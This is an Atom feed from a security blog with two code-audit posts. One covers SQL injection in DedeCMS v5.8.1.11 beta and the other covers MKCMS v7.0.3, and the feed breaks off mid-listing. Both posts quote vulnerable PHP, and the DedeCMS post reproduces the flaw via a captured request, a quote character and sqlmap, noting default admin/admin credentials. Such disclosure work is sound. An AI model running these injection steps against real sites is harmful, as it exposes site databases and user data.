<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nice&#39;s Blog</title>
  
  
  <link href="https://shuaiqiyu.github.io/atom.xml" rel="self"/>
  
  <link href="https://shuaiqiyu.github.io/"/>
  <updated>2021-03-26T09:55:36.282Z</updated>
  <id>https://shuaiqiyu.github.io/</id>
  
  <author>
    <name>Nice</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dedecms background SQL injection vulnerability</title>
    <link href="https://shuaiqiyu.github.io/2021/03/26/Dedecmsv5.8%20SQL%20Injection/"/>
    <id>https://shuaiqiyu.github.io/2021/03/26/Dedecmsv5.8%20SQL%20Injection/</id>
    <published>2021-03-26T08:49:53.000Z</published>
    <updated>2021-03-26T09:55:36.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnerability-Profile"><a href="#Vulnerability-Profile" class="headerlink" title="Vulnerability Profile"></a>Vulnerability Profile</h1><p>DedecMS is a PHP website management system developed by ZhiMeng team. It features simplicity, ease of use and high efficiency, and sets up a variety of websites with distinctive features, such as local portals, industry portals, government and enterprise sites, etc.</p><p>On <a href="https://github.com/dedecms/DedeCMS">Dedecms’ official GitHub home page</a>, they updated Dedecms to the <code>v5.8.1.11 beta</code> a week ago.However, in the background file <code>MAKEHTM_FREELIST_ACTION.php</code> for this version, there is a loose parameter filtering situation, which leads to the SQL injection vulnerability.Malicious hackers can use this vulnerability to gain access to sensitive data or host permissions.</p><h1 id="Affected-Area"><a href="#Affected-Area" class="headerlink" title="Affected Area"></a>Affected Area</h1><p><strong>DedeCMS v5.8.1.11 beta</strong>（Lower versions will be serious in subsequent updates）</p><h1 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type"></a>Vulnerability Type</h1><p>SQL Injection</p><h1 id="Recurring-Environment"><a href="#Recurring-Environment" class="headerlink" title="Recurring Environment"></a>Recurring Environment</h1><p><strong>CMS version number：V5.8.1</strong><br><strong>PHP version：7.3.4</strong><br><strong>MYSQL version：5.70</strong></p><h1 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a>Code Analysis</h1><p>Vulnerability code located in <code>dede/makehtml_freelist_action.php</code>,Here is the vulnerability code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 生成自由列表操作</span><br><span class="line"> *</span><br><span class="line"> * @version   $Id: makehtml_freelist_action.php 1 9:11 2010年7月19日 $</span><br><span class="line"> * @package   DedeCMS.Administrator</span><br><span class="line"> * @founder   IT柏拉图, https:&#x2F;&#x2F;weibo.com&#x2F;itprato</span><br><span class="line"> * @author    DedeCMS团队</span><br><span class="line"> * @copyright Copyright (c) 2007 - 2021, 上海卓卓网络科技有限公司 (DesDev, Inc.)</span><br><span class="line"> * @license   http:&#x2F;&#x2F;help.dedecms.com&#x2F;usersguide&#x2F;license.html</span><br><span class="line"> * @link      http:&#x2F;&#x2F;www.dedecms.com</span><br><span class="line"> *&#x2F;</span><br><span class="line">require_once dirname(__FILE__) . &quot;&#x2F;config.php&quot;;</span><br><span class="line">CheckPurview(&#39;sys_MakeHtml&#39;);</span><br><span class="line">require_once DEDEINC . &quot;&#x2F;arc.freelist.class.php&quot;;</span><br><span class="line">if (empty($startid)) &#123;</span><br><span class="line">    $startid &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci &#x3D; &quot; aid &gt;&#x3D; $startid &quot;;</span><br><span class="line">if (!empty($endid) &amp;&amp; $endid &gt;&#x3D; $startid) &#123;</span><br><span class="line">    $ci .&#x3D; &quot; And aid &lt;&#x3D; $endid &quot;;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html; charset&#x3D;&#123;$cfg_soft_lang&#125;&quot;);</span><br><span class="line">$dsql-&gt;SetQuery(&quot;Select aid From #@__freelist where $ci&quot;);</span><br><span class="line">$dsql-&gt;Execute();</span><br><span class="line">while ($row &#x3D; $dsql-&gt;GetArray()) &#123;</span><br><span class="line">    $idArray[] &#x3D; $row[&#39;aid&#39;];</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($pageno)) &#123;</span><br><span class="line">    $pageno &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (empty($idArray)) &#123;</span><br><span class="line">    $idArray &#x3D; &#39;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$totalpage &#x3D; count($idArray);</span><br><span class="line">if (isset($idArray[$pageno])) &#123;</span><br><span class="line">    $lid &#x3D; $idArray[$pageno];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ShowMsg(&quot;完成所有文件创建！&quot;, &#39;javascript:;&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$lv &#x3D; new FreeList($lid);</span><br><span class="line">$ntotalpage &#x3D; $lv-&gt;TotalPage;</span><br><span class="line">if (empty($mkpage)) &#123;</span><br><span class="line">    $mkpage &#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (empty($maxpagesize)) &#123;</span><br><span class="line">    $maxpagesize &#x3D; 50;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果栏目的文档太多，分多批次更新</span><br><span class="line">if ($ntotalpage &lt;&#x3D; $maxpagesize) &#123;</span><br><span class="line">    $lv-&gt;MakeHtml();</span><br><span class="line">    $finishType &#x3D; true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $lv-&gt;MakeHtml($mkpage, $maxpagesize);</span><br><span class="line">    $finishType &#x3D; false;</span><br><span class="line">    $mkpage &#x3D; $mkpage + $maxpagesize;</span><br><span class="line">    if ($mkpage &gt;&#x3D; ($ntotalpage + 1)) &#123;</span><br><span class="line">        $finishType &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$lv-&gt;Close();</span><br><span class="line">$nextpage &#x3D; $pageno + 1;</span><br><span class="line">if ($nextpage &#x3D;&#x3D; $totalpage) &#123;</span><br><span class="line">    ShowMsg(&quot;完成所有文件创建！&quot;, &#39;javascript:;&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ($finishType) &#123;</span><br><span class="line">        $gourl &#x3D; &quot;makehtml_freelist_action.php?maxpagesize&#x3D;$maxpagesize&amp;startid&#x3D;$startid&amp;endid&#x3D;$endid&amp;pageno&#x3D;$nextpage&quot;;</span><br><span class="line">        ShowMsg(&quot;成功创建列表：&quot; . $tid . &quot;，继续进行操作！&quot;, $gourl, 0, 100);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $gourl &#x3D; &quot;makehtml_freelist_action.php?mkpage&#x3D;$mkpage&amp;maxpagesize&#x3D;$maxpagesize&amp;startid&#x3D;$startid&amp;endid&#x3D;$endid&amp;pageno&#x3D;$pageno&quot;;</span><br><span class="line">        ShowMsg(&quot;列表：&quot; . $tid . &quot;，继续进行操作...&quot;, $gourl, 0, 100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$dsql-&gt;ExecuteNoneQuery(&quot;Update &#96;#@__freelist&#96; set  nodefault&#x3D;&#39;1&#39; where aid&#x3D;&#39;$startid&#39;;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The problem is very simple. You can see that in line 16, a judgment is made on <code>starid</code>. If the value of this parameter is <strong>NULL</strong>, then <code>0</code> is assigned to <code>starid</code>. Then on line 20, the value of <code>starid</code> is passed to <code>ci</code>, but on line 25, <code>ci</code> is concatenated into the database statement without any filtering, causing the problem<br><img src="https://img.imgdb.cn/item/605da8168322e6675c7178c4.png"></p><h1 id="Local-Recurrence"><a href="#Local-Recurrence" class="headerlink" title="Local Recurrence"></a>Local Recurrence</h1><p>Download the source code on GitHub for installation, source address:<strong><a href="https://github.com/dedecms/DedeCMS">https://github.com/dedecms/DedeCMS</a></strong><br>Use the account password set at the time of installation to enter the background, the default is <code>admin/admin</code><br>completing:<br><img src="https://img.imgdb.cn/item/605daafc8322e6675c7356f6.png"></p><p>Enter the vulnerability point：<code>http://192.168.5.62:81/dede/makehtml_freelist_action.php?startid=2</code>,Use the BurpSuit to grab the packet from this page</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;dede&#x2F;makehtml_freelist_action.php?startid&#x3D;2 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.5.62:81</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;mrb3nr8o749ivis4ht88l6l0bg; _csrf_name_82f99071&#x3D;034d348b605717cf5b1cd83a1d8b8bd8; _csrf_name_82f99071__ckMd5&#x3D;72f306a6331ccc26; DedeUserID&#x3D;1; DedeUserID__ckMd5&#x3D;8e635ad267f5c9bb; DedeLoginTime&#x3D;1616745752; DedeLoginTime__ckMd5&#x3D;d8bf0218bdaada0b</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Resend the original packet<br><img src="https://img.imgdb.cn/item/605dac3c8322e6675c7413e3.png"></p><p>Add <code>&#39;</code>after <code>startid</code>.See the <code>render</code>.Something is different, which means the database is responding<br><img src="https://img.imgdb.cn/item/605dacce8322e6675c746ffd.png"></p><p>Now, drop the raw packet into <code>sqlmap</code>,It’s worth noting that there are two hints,<strong>I select no</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie parameter &#39;_csrf_name_82f99071&#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y&#x2F;N] n</span><br><span class="line">Cookie parameter &#39;_csrf_name_82f99071__ckMd5&#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y&#x2F;N] n</span><br></pre></td></tr></table></figure><p>The end result<br><img src="https://img.imgdb.cn/item/605dade18322e6675c751a47.png"></p><p>We can also try to get the database<br><img src="https://img.imgdb.cn/item/605dae3b8322e6675c75593b.png"></p>]]></content>
    
    
    <summary type="html">dedecms最新版代码审计</summary>
    
    
    
    <category term="代码审计" scheme="https://shuaiqiyu.github.io/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="https://shuaiqiyu.github.io/tags/php/"/>
    
    <category term="代码审计" scheme="https://shuaiqiyu.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>米酷CMS v7.0.3 sql注入漏洞审计及本地复现</title>
    <link href="https://shuaiqiyu.github.io/2021/03/24/%E7%B1%B3%E9%85%B7CMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>https://shuaiqiyu.github.io/2021/03/24/%E7%B1%B3%E9%85%B7CMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-03-24T02:28:15.000Z</published>
    <updated>2021-03-24T03:43:37.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。<br><a href="https://www.mkcms.com/">米酷CMS v7.0.3</a>版本<code>admin/model/admin_edit.php</code>、<code>ucenter/reg.php</code>等文件存在漏洞，攻击者可以利用漏洞进行sql注入攻击。</p><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>米酷CMS v7.0.3</p><h1 id="第一处注入"><a href="#第一处注入" class="headerlink" title="第一处注入"></a>第一处注入</h1><ul><li><strong>漏洞文件</strong><br><code>ucenter/reg.php</code> （前台文件）</li><li><strong>分析</strong><br>在<code>reg.php</code>这个文件中，第9行处对<code>$username</code>这个参数进行了查询拼接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&#39;..&#x2F;system&#x2F;inc.php&#39;);</span><br><span class="line">if(isset($_SESSION[&#39;user_name&#39;]))&#123;</span><br><span class="line">header(&#39;location:index.php&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">$username &#x3D; stripslashes(trim($_POST[&#39;name&#39;]));</span><br><span class="line">&#x2F;&#x2F; 检测用户名是否存在</span><br><span class="line">$query &#x3D; mysqli_query($conn,&quot;select u_id from mkcms_user where u_name&#x3D;&#39;$username&#39;&quot;);</span><br><span class="line">if(mysqli_fetch_array($query))&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;用户名已存在，请换个其他的用户名&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_user where u_email &#x3D; &quot;&#39;.$_POST[&#39;email&#39;].&#39;&quot;&#39;);</span><br><span class="line">if(mysqli_fetch_array($result))&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;邮箱已存在，请换个其他的邮箱&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$password &#x3D; md5(trim($_POST[&#39;password&#39;]));</span><br><span class="line">$email &#x3D; trim($_POST[&#39;email&#39;]);</span><br><span class="line">$regtime &#x3D; time();</span><br><span class="line">$token &#x3D; md5($username.$password.$regtime); &#x2F;&#x2F;创建用于激活识别码</span><br><span class="line">$token_exptime &#x3D; time()+60*60*24;&#x2F;&#x2F;过期时间为24小时后</span><br><span class="line">$data[&#39;u_name&#39;] &#x3D; $username;</span><br><span class="line">$data[&#39;u_password&#39;] &#x3D;$password;</span><br><span class="line">$data[&#39;u_email&#39;] &#x3D; $email;</span><br><span class="line">$data[&#39;u_regtime&#39;] &#x3D;$regtime;</span><br><span class="line">if($mkcms_mail&#x3D;&#x3D;1)&#123;</span><br><span class="line">$data[&#39;u_status&#39;] &#x3D;0;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$data[&#39;u_status&#39;] &#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$data[&#39;u_group&#39;] &#x3D;1;</span><br><span class="line">$data[&#39;u_fav&#39;] &#x3D;0;</span><br><span class="line">$data[&#39;u_plays&#39;] &#x3D;0;</span><br><span class="line">$data[&#39;u_downs&#39;] &#x3D;0;</span><br><span class="line">&#x2F;&#x2F;推广注册</span><br><span class="line">if (isset($_GET[&#39;tg&#39;])) &#123;</span><br><span class="line">$data[&#39;u_qid&#39;] &#x3D;$_GET[&#39;tg&#39;];</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_user where u_id&#x3D;&quot;&#39;.$_GET[&#39;tg&#39;].&#39;&quot;&#39;);</span><br><span class="line">if($row &#x3D; mysqli_fetch_array($result))&#123;</span><br><span class="line"></span><br><span class="line">$u_points&#x3D;$row[&#39;u_points&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$_data[&#39;u_points&#39;] &#x3D;$u_points+$mkcms_tuiguang;</span><br><span class="line">$sql &#x3D; &#39;update mkcms_user set &#39;.arrtoupdate($_data).&#39; where u_id&#x3D;&quot;&#39;.$_GET[&#39;tg&#39;].&#39;&quot;&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;&#125;</span><br><span class="line">$data[&#39;u_question&#39;] &#x3D;$token;</span><br><span class="line">$str &#x3D; arrtoinsert($data);</span><br><span class="line">$sql &#x3D; &#39;insert into mkcms_user (&#39;.$str[0].&#39;) values (&#39;.$str[1].&#39;)&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;</span><br><span class="line">if($mkcms_mail&#x3D;&#x3D;1)&#123;</span><br><span class="line">&#x2F;&#x2F;写入数据库成功，发邮件</span><br><span class="line">include(&quot;emailconfig.php&quot;);</span><br><span class="line">    &#x2F;&#x2F;创建$smtp对象 这里面的一个true是表示使用身份验证,否则不使用身份验证.</span><br><span class="line">    $smtp &#x3D; new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); </span><br><span class="line">    $smtp-&gt;debug &#x3D; false; </span><br><span class="line">    $mailType &#x3D; &quot;HTML&quot;; &#x2F;&#x2F;信件类型，文本:text；网页：HTML</span><br><span class="line">    $email &#x3D; $email;  &#x2F;&#x2F;收件人邮箱</span><br><span class="line">    $emailTitle &#x3D; &quot;&quot;.$mkcms_name.&quot;用户账号激活&quot;; &#x2F;&#x2F;邮件主题</span><br><span class="line">    $emailBody &#x3D; &quot;亲爱的&quot;.$username.&quot;：&lt;br&#x2F;&gt;感谢您在我站注册了新账号。&lt;br&#x2F;&gt;请点击链接激活您的账号。&lt;br&#x2F;&gt;&lt;a href&#x3D;&#39;&quot;.$mkcms_domain.&quot;ucenter&#x2F;active.php?verify&#x3D;&quot;.$token.&quot;&#39; target&#x3D;&#39;_blank&#39;&gt;&quot;.$mkcms_domain.&quot;ucenter&#x2F;active.php?verify&#x3D;&quot;.$token.&quot;&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;如果以上链接无法点击，请将它复制到你的浏览器地址栏中进入访问，该链接24小时内有效。&lt;br&#x2F;&gt;如果此次激活请求非你本人所发，请忽略本邮件。&lt;br&#x2F;&gt;&lt;p style&#x3D;&#39;text-align:right&#39;&gt;-------- &quot;.$mkcms_name.&quot; 敬上&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; sendmail方法</span><br><span class="line">    &#x2F;&#x2F; 参数1是收件人邮箱</span><br><span class="line">    &#x2F;&#x2F; 参数2是发件人邮箱</span><br><span class="line">    &#x2F;&#x2F; 参数3是主题（标题）</span><br><span class="line">    &#x2F;&#x2F; 参数4是邮件主题（标题）</span><br><span class="line">    &#x2F;&#x2F; 参数4是邮件内容  参数是内容类型文本:text 网页:HTML</span><br><span class="line">    $rs &#x3D; $smtp-&gt;sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);</span><br><span class="line">if($rs&#x3D;&#x3D;true)&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！请登录到您的邮箱及时激活您的账号！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if($mkcms_smsname!&#x3D;&quot;&quot;)&#123;</span><br><span class="line">if($_POST[&#39;txtsmscode&#39;]&#x3D;&#x3D;&quot;&quot; || $_POST[&#39;txtsmscode&#39;]!&#x3D;$_SESSION[&#39;mobilecode&#39;])&#123;</span><br><span class="line">echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;alert(&#39;短信验证码不能为空！&#39;);history.go(-1);&lt;&#x2F;script&gt;&quot;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;head.php&#39;);?&gt;</span><br><span class="line">&lt;title&gt;会员登录-&lt;?php echo $mkcms_seoname;?&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&lt;?php echo $mkcms_keywords;?&gt;&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&lt;?php echo $mkcms_description;?&gt;&quot;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; media&#x3D;&quot;screen&quot; href&#x3D;&quot;css&#x2F;main.css&quot; &#x2F;&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">.p-imgcon &#123;margin-top: -30px;height: 500px;background-color: #e6e6e6;background: #fff url(&lt;?php</span><br><span class="line">$text&#x3D;file_get_contents(&#39;https:&#x2F;&#x2F;i.360kan.com&#x2F;login&#39;); </span><br><span class="line">$link&#x3D;&quot;#&lt;a href&#x3D;&#39;https:&#x2F;&#x2F;www.360kan.com&#x2F;(.*?)&#39;&gt;&lt;&#x2F;a&gt;#&quot;;</span><br><span class="line">preg_match_all($link,$text,$sarr);</span><br><span class="line">$link1&#x3D;$sarr[1][0];</span><br><span class="line">$link2&#x3D;&quot;&#x2F;vod&#x2F;&quot;.$link1;</span><br><span class="line">preg_match(&#39;&#x2F;https[^&gt;]*jpg&#x2F;Ui&#39;, $text, $match);</span><br><span class="line">print($match[0]);</span><br><span class="line">?&gt;) center 0 no-repeat;&#125;</span><br><span class="line">.login-section 